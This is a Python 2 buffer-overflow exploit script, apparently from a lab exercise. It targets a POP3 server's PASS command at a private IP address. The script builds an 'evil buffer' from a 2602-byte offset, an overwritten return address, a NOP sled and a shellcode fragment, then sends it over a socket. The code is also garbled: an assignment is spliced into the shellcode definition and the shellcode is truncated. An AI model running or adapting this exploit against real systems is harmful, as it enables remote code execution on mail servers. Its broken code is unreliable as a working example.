#!/usr/bin/python
#
#
#Test One to confirm the Crash of the Application
#
#Imports
import socket

# Send 2700 A's
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

shellcode = (
buffer = "\x41" * 2602 + "\x42\x42\x42\x42" + (2700 - 4 - 2602) * "\x43"


    
    "\xaa\x9c\x3a\x3a\x29\x14\xc3\xb9\x31\x5d\xc6\x86\xf5\x8e\xba" +
    "\x97\x93\xb0\x69\x97\xb1")


buffer = "A" * 2602 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
#buffer = "\x41" * 2602 + "\x42\x42\x42\x42" + shellcode    
#buffer = "\x41" * 2602 + "\x42\x42\x42\x42" + (3500 - 4 - 2602) * "\x43"


try:
    print "\n Sending evil buffer"
    s.connect(('192.168.0.50',110))
    data = s.recv(1024)
    s.send('USER test' + '\r\n')
    data = s.recv(1024)
    s.send('PASS  ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3!"


